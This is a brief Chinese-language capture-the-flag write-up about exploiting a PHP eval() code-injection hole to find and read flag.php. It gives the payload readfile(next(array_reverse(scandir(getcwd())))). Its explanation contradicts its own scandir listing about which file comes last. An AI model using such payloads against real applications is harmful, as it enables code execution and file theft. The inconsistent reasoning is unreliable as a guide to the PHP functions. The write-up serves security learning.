题目理解：
看着好像要输入php代码.
试着输入echo报错：Parse error:  syntax error, unexpected end of file in /var/www/html/index.php(107) : eval()'d code on line 1
有执行eval的漏洞

## 问题根源

`scandir(getcwd())`返回数组顺序：

```
[0]=>.
[1]=>..
[2]=>index.php
[3]=>flag.php
```

`end()`指向数组最后一项，但是现在结果却是 index.php，说明 flag 文件**不在最后一位**，我们需要遍历偏移读取！

# 方案：用 array_reverse 反转数组 + next () 取倒数第二个

```
readfile(next(array_reverse(scandir(getcwd()))));
```

这道题是要去寻找flag.php文件，拿到标识
